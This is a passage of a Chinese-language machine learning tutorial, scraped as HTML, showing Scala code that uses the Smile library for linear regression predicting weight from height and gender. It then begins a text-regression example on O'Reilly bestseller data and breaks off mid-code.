&lt;p&gt;在这幅图像中，绿色代表女性，蓝色代表男性，可以看到，男女的身高和体重有很大部分是重叠的。因此，如果我们忽略男女性别，数据看上去依旧是呈线性的（如&lt;strong&gt;左&lt;/strong&gt;图所示）。然而，若不考虑男女性别差异，模型就不够精确。&lt;/p&gt;
&lt;p&gt;在本例中，找出这种区别（将数据依性别分组）是小事一桩，然而，你可能会碰到一些其中的数据区分不那么明显的数据集。意识到这种可能性对数据分组是有帮助的，从而有助于改善机器学习应用程序的性能。&lt;/p&gt;
&lt;p&gt;既然我们已经考察过数据，也知道我们确实可以建立一条回归线来拟合数据，现在就该训练模型了。Smile 库提供了&lt;a href=&quot;http://en.wikipedia.org/wiki/Ordinary_least_squares&quot;&gt;普通最小二乘算法&lt;/a&gt;，我们可以用如下代码轻松调用：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061399084663484&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Scala&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val olsModel = new OLS(testData._1,testData._2)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061399084663484-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061399084663484-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;olsModel&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;OLS&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0007 seconds] --&gt;
&lt;p&gt;有了这个 OLS 模型，我们现在可以根据某人的身高和性别预测其体重了：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06139c686994822&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
println(&quot;Prediction for Male of 1.7M: &quot; +olsModel.predict(Array(0.0,170.0)))
println(&quot;Prediction for Female of 1.7M:&quot; + olsModel.predict(Array(1.0,170.0)))
println(&quot;Model Error:&quot; + olsModel.error())&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06139c686994822-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06139c686994822-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06139c686994822-3&quot;&gt;3&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06139c686994822-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Prediction for Male of 1.7M: &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;olsModel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;170.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06139c686994822-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Prediction for Female of 1.7M:&quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;olsModel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;170.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06139c686994822-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Model Error:&quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;olsModel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06139f813408397&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
Prediction for Male of 1.7M: 79.14538559840447
    Prediction for Female of 1.7M:70.35580395758966
    Model Error:4.5423150758157185&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06139f813408397-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06139f813408397-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06139f813408397-3&quot;&gt;3&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06139f813408397-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;Prediction &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Male &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.7M&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;79.14538559840447&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06139f813408397-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Prediction &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Female &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.7M&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;70.35580395758966&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06139f813408397-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Model &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4.5423150758157185&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0008 seconds] --&gt;
&lt;p&gt;回顾前文的分类算法，它有一个能够反映模型性能的先验值。回归分析是一种更强大的统计方法，它可以给出一个实际误差。这个值反映了偏离拟合回归线的平均程度，因此可以说，在这个模型中，一个身高1.70米的男性的预测体重是 79.15kg ± 4.54kg，4.54 为误差值。注意，如果不考虑数据的男女差异，这一误差会增加到 5.5428。换言之，考虑了数据的男女差异后，模型在预测时，精确度提高了 ±1kg&lt;/p&gt;
&lt;p&gt;最后一点，Smile 库也提供了一些关于模型的统计信息。R平方值是模型的均方根误差（RMSE）与平均函数的 RMSE 之比。这个值介于 0 与 1 之间。假如你的模型能够准确的预测每一个数据点，R平方值就是 1，如果模型的预测效果比平均函数差，则该值为 0。在机器学习领域中，通常将该值乘以 100，代表模型的精确度。它是一个归一化值，所以可以用来比较不同模型的性能。&lt;/p&gt;
&lt;p&gt;本部分总结了线性回归分析的过程，如果你还想了解如何将回归分析应用于非线性数据，请随时学习下一个实例“应用文本回归尝试畅销书排行预测”。&lt;/p&gt;
&lt;h2&gt;应用文本回归尝试预测最畅销书排行&lt;/h2&gt;
&lt;p&gt;在实例“根据身高预测体重”中，我们介绍了线性回归的概念。然而，有时候需要将回归分析应用到像文本这类的非数字数据中去。&lt;/p&gt;
&lt;p&gt;在本例中，我们将通过尝试预测最畅销的 100 本 O’Reilly 公司出版的图书，说明如何应用文本回归。此外，我们还介绍在本例的特殊情况下应用文本回归无法解决问题。原因仅仅是这些数据中不含有可以被我们的测试数据利用的信号。即使如此，本例也并非一无是处，因为在实践中，数据可能会含有实际信号，该信号可以被这里要介绍的文本回归检测到。&lt;/p&gt;
&lt;p&gt;本例使用到的数文件可以在&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/TextRegression_Example_1.csv&quot;&gt;这里&lt;/a&gt;下载。除了 Smile 库，本例也会使用 &lt;a href=&quot;https://www.versioneye.com/java/com.github.tototoshi:scala-csv_2.11/1.2.1&quot;&gt;Scala-csv 库&lt;/a&gt;，因为 csv 中包含带逗号的字符串。我们从获取需要的数据开始：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613a3269937307&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
object TextRegression  {

  def main(args: Array[String]): Unit = {

    //Get the example data
    //获取案例数据
      val basePath = &quot;/users/.../TextRegression_Example_4.csv&quot;
      val testData = getDataFromCSV(new File(basePath))
  }

  def getDataFromCSV(file: File) : List[(String,Int,String)]= {
    val reader = CSVReader.open(file)
    val data = reader.all()

    val documents = data.drop(1).map(x =&amp;gt; (x(1),x(3)toInt,x(4)))
    return documents
  }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a3269937307-18&quot;&gt;18&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;TextRegression&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Unit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get the example data&lt;/span&gt;
&lt;/div&gt;
